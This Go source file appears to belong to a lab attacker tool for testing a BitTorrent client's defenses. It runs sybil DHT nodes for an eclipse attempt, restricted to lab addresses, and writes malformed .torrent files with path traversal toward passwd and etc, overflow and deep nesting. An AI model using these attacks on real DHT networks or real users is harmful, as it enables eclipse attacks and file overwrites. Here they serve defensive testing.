package main

import (
	"context"
	"crypto/rand"
	"encoding/binary"
	"errors"
	"flag"
	"fmt"
	"log/slog"
	"net"
	"net/netip"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"

	"github.com/arjun-kshirsagar/beacon/core/bencode"
)

const maxSybils = 64

// cmdSybil runs many DHT nodes from one address that answer every lookup
// with each other, posing as the nodes closest to whatever is looked up, and
// never return peers: an eclipse attempt. The defense: a lookup takes at most
// two candidates from any one /24 and routing table buckets hold at most two
// nodes per /24, so honest nodes elsewhere are still queried and the victim
// finds the real peers.
func cmdSybil(ctx context.Context, args []string) error {
	fs := flag.NewFlagSet("sybil", flag.ContinueOnError)
	ip := fs.String("ip", "", "lab IP address to run the nodes on")
	base := fs.Int("port", 7000, "first UDP port")
	n := fs.Int("nodes", 32, fmt.Sprintf("number of fake nodes (at most %d)", maxSybils))
	if err := fs.Parse(args); err != nil || *ip == "" {
		return errors.New("usage: attacker sybil -ip addr [-port n] [-nodes n]")
	}
	addr, err := netip.ParseAddr(*ip)
	if err != nil || !labAddr(addr) || !addr.Is4() {
		return fmt.Errorf("attacker: -ip must be a lab IPv4 address, not %q", *ip)
	}
	count := min(*n, maxSybils)
	type sybil struct {
		conn *net.UDPConn
		port int
	}
	var all []sybil
	for i := range count {
		c, err := net.ListenUDP("udp4", &net.UDPAddr{IP: addr.AsSlice(), Port: *base + i})
		if err != nil {
			return err
		}
		defer c.Close()
		all = append(all, sybil{c, *base + i})
	}
	go func() {
		<-ctx.Done()
		for _, s := range all {
			s.conn.Close()
		}
	}()
	var answered atomic.Int64
	// nodesNear returns compact node info for 8 sybils, each given an ID that
	// matches target in its first 18 bytes: closer than any honest node.
	nodesNear := func(target []byte) string {
		var b []byte
		for i := range 8 {
			id := make([]byte, 20)
			copy(id, target)
			rand.Read(id[18:])
			b = append(b, id...)
			ip4 := addr.As4()
			b = append(b, ip4[:]...)
			b = binary.BigEndian.AppendUint16(b, uint16(all[(i+int(id[19]))%len(all)].port))
		}
		return string(b)
	}
	errc := make(chan error, len(all))
	for _, s := range all {
		go func() {
			myID := make([]byte, 20)
			rand.Read(myID)
			buf := make([]byte, 1500)
			for {
				n, from, err := s.conn.ReadFromUDP(buf)
				if err != nil {
					errc <- nil
					return
				}
				if fa, ok := netip.AddrFromSlice(from.IP); !ok || !labAddr(fa) {
					continue // only ever answer lab addresses
				}
				q, err := bencode.Decode(buf[:n])
				m, ok := q.(map[string]any)
				if err != nil || !ok || m["y"] != "q" {
					continue
				}
				tid, _ := m["t"].(string)
				a, _ := m["a"].(map[string]any)
				r := map[string]any{"id": string(myID)}
				switch m["q"] {
				case "find_node":
					t, _ := a["target"].(string)
					r["nodes"] = nodesNear([]byte(t))
				case "get_peers":
					t, _ := a["info_hash"].(string)
					r["nodes"] = nodesNear([]byte(t))
					r["token"] = "sybil"
				}
				resp, err := bencode.Encode(map[string]any{"t": tid, "y": "r", "r": r})
				if err != nil {
					continue
				}
				s.conn.WriteToUDP(resp, from)
				answered.Add(1)
			}
		}()
	}
	slog.Info("sybil nodes up", "ip", addr, "first port", *base, "nodes", count)
	for range all {
		<-errc
	}
	slog.Info("sybil done", "queries answered", answered.Load())
	return nil
}

// cmdBadTorrents writes malformed .torrent files for the victim to open. The
// defense: the bencode and metainfo parsers bound nesting, lengths and
// counts, reject unsafe paths, and return errors rather than crashing.
func cmdBadTorrents(args []string) error {
	fs := flag.NewFlagSet("badtorrents", flag.ContinueOnError)
	out := fs.String("o", "bad-torrents", "directory to write into")
	if err := fs.Parse(args); err != nil {
		return err
	}
	if err := os.MkdirAll(*out, 0o755); err != nil {
		return err
	}
	pieces := strings.Repeat("x", 20)
	info := func(fields string) string { return "d8:announce3:foo4:infod" + fields + "ee" }
	files := map[string]string{
		"deep-nesting.torrent":      strings.Repeat("l", 100000) + strings.Repeat("e", 100000),
		"huge-string.torrent":       "d8:announce999999999999:x",
		"negative-length.torrent":   info("6:lengthi-5e4:name1:a12:piece lengthi16384e6:pieces20:" + pieces),
		"zero-piece-length.torrent": info("6:lengthi5e4:name1:a12:piece lengthi0e6:pieces20:" + pieces),
		"pieces-mismatch.torrent":   info("6:lengthi99999999e4:name1:a12:piece lengthi16384e6:pieces20:" + pieces),
		"path-traversal.torrent":    info("5:filesld6:lengthi5e4:pathl2:..6:passwdeee4:name1:a12:piece lengthi16384e6:pieces20:" + pieces),
		"absolute-path.torrent":     info("5:filesld6:lengthi5e4:pathl0:6:passwdeee4:name1:a12:piece lengthi16384e6:pieces20:" + pieces),
		"name-slash.torrent":        info("6:lengthi5e4:name6:../etc12:piece lengthi16384e6:pieces20:" + pieces),
		"leading-zero.torrent":      info("6:lengthi05e4:name1:a12:piece lengthi16384e6:pieces20:" + pieces),
		"duplicate-keys.torrent":    info("6:lengthi5e6:lengthi6e4:name1:a12:piece lengthi16384e6:pieces20:" + pieces),
		"truncated.torrent":         info("6:lengthi5e4:name1:a12:piece lengthi16384e6:pieces20:")[:60],
		"trailing-data.torrent":     info("6:lengthi5e4:name1:a12:piece lengthi16384e6:pieces20:"+pieces) + "junk",
		"int-overflow.torrent":      info("6:lengthi99999999999999999999999e4:name1:a12:piece lengthi16384e6:pieces20:" + pieces),
	}
	for name, body := range files {
		if err := os.WriteFile(filepath.Join(*out, name), []byte(body), 0o644); err != nil {
			return err
		}
	}
	slog.Info("wrote malformed torrents", "dir", *out, "count", len(files))
	return nil
}
